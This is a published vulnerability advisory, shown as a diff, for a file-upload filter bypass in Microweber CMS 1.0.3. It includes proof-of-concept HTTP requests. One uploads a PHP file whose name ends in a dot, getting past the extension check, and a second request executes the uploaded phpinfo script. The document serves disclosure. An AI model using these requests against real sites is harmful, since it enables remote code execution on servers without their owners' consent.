@@ -1,0 +1,74 @@
+﻿
+Microweber v1.0.3 File Upload Filter Bypass Remote PHP Code Execution
+
+
+Vendor: Microweber Team
+Product web page: http://www.microweber.com
+Affected version: 1.0.3
+
+Summary: Microweber is an open source drag and drop PHP/Laravel CMS licensed
+under Apache License, Version 2.0 which allows you to create your own website,
+blog or online shop.
+
+Desc: Microweber suffers from an authenticated arbitrary command execution
+vulnerability. The issue is caused due to the improper verification when
+uploading files in '/src/Microweber/functions/plupload.php' script. This
+can be exploited to execute arbitrary PHP code by bypassing the extension
+restriction by putting the dot character at the end of the filename and uploading
+a malicious PHP script file that will be stored in '/userfiles/media/localhost/uploaded'
+directory.
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5250
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5250.php
+
+
+12.07.2015
+
+--
+
+
+PoC Requests:
+-------------
+
+1.
+
+POST /microweber-latest/plupload?token=1111111111222222222233333333334444444444&path=media%25255Clocalhost%25255C&path=media%255Clocalhost%255Cuploaded%255C HTTP/1.1
+Host: localhost
+Proxy-Connection: keep-alive
+Content-Length: 319
+Origin: http://localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqX83MP6Cg5JpA193
+Accept: */*
+Referer: http://localhost/microweber-latest/editor_tools/plupload?type=explorer&filters=*&multiple=true&autostart=undefined&mwv=1.0.3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: mwui=%7B%22%23modules-and-layouts%2C%23tab_modules%2C.tst-modules%22%3A%22true%22%7D; recommend=%7B%22logo%22%3A1%7D; back_to_admin=http%3A//localhost/microweber-latest/admin/view%3Amodules/load_module%3Afiles%23path%3Dmedia%255Clocalhost%255Cuploaded%255C%26select-file%3Dhttp%3A//localhost/microweber-latest/userfiles/media/localhost/uploaded/phpinfo.php; laravel_session=eyJpdiI6ImNYNnkyWjJkOXZyTVRDMXlcL0pKQzBRPT0iLCJ2YWx1ZSI6Ilp6QjhDYjRRMEY4NGR5RzVuZGNxSnd1V3dGQ1R6OVdaWjZrZStiT1Q2bVM3UmRoQjNrak1ORzV5bXZjbzVDSitqdVVkdzdqOFVQa2hZdWRwMlwvMSttZz09IiwibWFjIjoiNGQxYzkwOTk4YmIzNTgzNWRiZmZlOTM4N2I2MzA1NjIzODcwNWRmMWM5ZDcwN2YxMGJlZmQ2ZjUxYmMzNjVjOSJ9
+
+------WebKitFormBoundaryqX83MP6Cg5JpA193
+Content-Disposition: form-data; name="name"
+
+phpinfo.php.
+------WebKitFormBoundaryqX83MP6Cg5JpA193
+Content-Disposition: form-data; name="file"; filename="phpinfo.php."
+Content-Type: application/octet-stream
+
+<?php
+phpinfo();
+?>
+------WebKitFormBoundaryqX83MP6Cg5JpA193--
+
+
+
+2.
+
+GET http://localhost/microweber-latest/userfiles/media/localhost/uploaded/phpinfo.php HTTP/1.1
